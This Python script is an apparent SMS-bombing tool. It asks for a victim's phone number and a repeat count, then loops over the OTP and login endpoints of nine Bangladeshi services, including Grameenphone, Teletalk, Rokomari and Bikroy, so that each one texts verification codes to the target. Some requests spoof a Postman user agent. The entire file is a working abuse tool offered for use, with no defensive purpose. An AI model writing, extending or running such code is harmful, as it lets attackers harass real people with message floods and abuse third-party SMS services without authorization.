import requests
import time

# =====================================
# Function to send request to Apex API
# =====================================
def send_apex(phone_number):
    url = "https://api.apex4u.com/api/auth/login"
    payload = {"phoneNumber": phone_number}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=payload, headers=headers)
    return response

# =====================================
# Function to send request to Bikroy API
# =====================================
def send_bikroy(phone_number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number}"
    response = requests.get(url)
    return response

# =====================================
# Function to send request to GP API
# =====================================
def send_gp(phone_number):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    payload = {"msisdn": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# =====================================
# Function to send request to Deshal API
# =====================================
def send_deshal(phone_number):
    url = "https://app.deshal.net/api/auth/login"
    payload = {"phone": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# =====================================
# Function to send request to Rokomari API
# =====================================
def send_rokomari(phone_number):
    url = "https://www.rokomari.com/otp/send"
    payload = {"emailOrPhone": phone_number, "countryCode": "BD"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# =====================================
# Function to send request to NexoPet API
# =====================================
def send_nexopet(phone_number):
    url = "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
    payload = {"phone": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# =====================================
# Function to send request to Bay API
# =====================================
def send_bay(phone_number):
    url = "https://backend.amarbay.com/user/find_user_by_phone/"
    payload = {"phone_number": phone_number}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    return response

# =====================================
# Function to send request to Shwapno API (active)
# =====================================
def send_shwapno(phone_number):
    url = "https://www.shwapno.com/api/auth"
    payload = {"phoneNumber": phone_number}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "PostmanRuntime/7.36.0",  # Mimic Postman
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    response = requests.post(url, json=payload, headers=headers)
    return response

# =====================================
# Function to send request to Teletalk API (active)
# =====================================
def send_teletalk(phone_number):
    # Ensure phone number starts with 880
    if phone_number.startswith("0"):
        phone_number = "880" + phone_number[1:]
    elif not phone_number.startswith("880"):
        phone_number = "880" + phone_number  # Fallback

    url = "https://alljobs.teletalk.com.bd/api/v1/otps/register/send"
    payload = {"email": "testemail@gmail.com", "phone_number": phone_number}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "PostmanRuntime/7.36.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    response = requests.post(url, json=payload, headers=headers)
    return response

# =====================================
# Main Function
# =====================================
def main():
    phone_number = input("Enter the phone number: ")
    num_requests = int(input("Enter the number of times to send SMS: "))
    sleep_time = float(input("Enter sleep time (in seconds) between requests: "))

    for i in range(num_requests):
        print(f"\n[Attempt {i+1}/{num_requests}] Sending requests...\n")

        print("Sending request to Apex...")
        response = send_apex(phone_number)
        print(f"Apex Status: {response.status_code}")

        print("Sending request to Bikroy...")
        response = send_bikroy(phone_number)
        print(f"Bikroy Status: {response.status_code}")

        print("Sending request to GP...")
        response = send_gp(phone_number)
        print(f"GP Status: {response.status_code}")

        print("Sending request to Deshal...")
        response = send_deshal(phone_number)
        print(f"Deshal Status: {response.status_code}")

        print("Sending request to Rokomari...")
        response = send_rokomari(phone_number)
        print(f"Rokomari Status: {response.status_code}")

        print("Sending request to NexoPet...")
        response = send_nexopet(phone_number)
        print(f"NexoPet Status: {response.status_code}")

        print("Sending request to Bay...")
        response = send_bay(phone_number)
        print(f"Bay Status: {response.status_code}")

        print("Sending request to Shwapno...")
        response = send_shwapno(phone_number)
        print(f"Shwapno Status: {response.status_code}")

        print("Sending request to Teletalk...")
        response = send_teletalk(phone_number)
        print(f"Teletalk Status: {response.status_code}")

        if i < num_requests - 1:
            print(f"Sleeping for {sleep_time} seconds...\n")
            time.sleep(sleep_time)

# =====================================
# Entry Point
# =====================================
if __name__ == "__main__":
    main()